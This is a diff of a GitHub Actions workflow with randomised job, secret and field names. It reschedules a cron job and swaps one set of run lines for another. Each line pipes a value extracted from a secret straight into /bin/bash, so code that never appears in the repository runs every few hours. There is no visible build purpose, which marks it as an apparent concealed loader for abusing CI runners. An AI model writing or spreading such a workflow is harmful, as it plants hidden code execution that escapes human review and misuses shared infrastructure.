@@ -3,8 +3,9 @@ name: yinnengzhe7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
-jobs:  # 16562
+    - cron: '10 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,12 +13,10 @@ jobs:  # 16562
       - uses: actions/checkout@v4
       - name: yinnengzhe7654
         env:
-          ro66: ${{ secrets.ro66 }}
+          rae7220: ${{ secrets.rae7220 }}
         run: |
-          echo $ro66 | jq -r .lh5 | /bin/bash
-          echo $dp96 | jq -r .stuf5885 | /bin/bash
-          echo $xle6 | jq -r .loxop18534 | /bin/bash
-          echo $c185 | jq -r .pxdsh27 | /bin/bash
-          echo $r452 | jq -r .az1008 | /bin/bash
-          echo $c7 | jq -r .dhez09898 | /bin/bash
+          echo $rae7220 | jq -r .xid41093 | /bin/bash
+          echo $ogmr693 | jq -r .viu84 | /bin/bash
+          echo $hbkls3 | jq -r .xv65 | /bin/bash
+          echo $doso93 | jq -r .cbdkf78458 | /bin/bash
 
